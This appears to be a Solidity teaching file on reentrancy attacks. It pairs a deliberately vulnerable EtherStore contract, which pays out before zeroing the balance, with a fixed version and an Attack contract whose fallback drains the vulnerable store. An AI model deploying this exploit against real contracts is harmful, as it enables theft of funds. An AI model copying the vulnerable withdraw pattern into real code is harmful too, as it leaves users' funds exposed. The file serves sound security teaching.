// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/**
 * 重入攻击-漏洞版本
 */
contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no balances");

        // ❌ 漏洞：下发送 在清零
        (bool sent , ) = msg.sender.call{value : bal}("");
        require(sent,"Failed to send Ether");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns(uint256){
        // return balances[msg.sender];
        return address(this).balance;
    }
}

/** 
 * 重入攻击-修复版本
 */
contract EtherStoreFixed {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "No balance");

        // ✅ 修复：先清零余额，再转账
        balances[msg.sender] = 0;

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * 攻击合约
 */
contract Attack {
    address public target;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _target){
        target = _target;
    }

    fallback() external payable{
        if(target.balance >= AMOUNT){
            (bool success,) = target.call(abi.encodeWithSignature("withdraw()"));

            require(success,"Reentrant call faild");
        }
    }

    function attack() external payable{
        require(msg.value >= AMOUNT,"Need 1 ether to attck");

        // deposit
        (bool success,) = target.call{value:AMOUNT}(abi.encodeWithSignature("deposit()"));
        require(success,"Deposit faild");

        // withdraw
        (bool success2 ,) = target.call(abi.encodeWithSignature("withdraw()"));
        require(success2,"withdraw faild");
    }

    function getBalance() public view returns (uint256){
        return address(this).balance;
    }
}
